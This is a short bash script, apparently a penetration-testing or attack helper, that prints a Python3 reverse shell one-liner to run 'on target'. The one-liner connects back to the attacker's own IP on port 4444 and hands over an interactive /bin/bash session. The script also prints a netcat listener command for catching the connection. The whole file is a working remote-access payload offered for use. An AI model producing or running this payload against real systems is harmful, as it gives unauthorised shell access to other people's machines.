#!/bin/bash
# Payload: Python3 Reverse Shell
MY_IP=$(hostname -I | awk '{print $1}')
PORT=4444

echo "[*] USE THIS ON TARGET:"
echo "------------------------------------------------"
echo "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$MY_IP\",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
echo "------------------------------------------------"
echo "[!] Start listener locally: nc -lvnp $PORT"
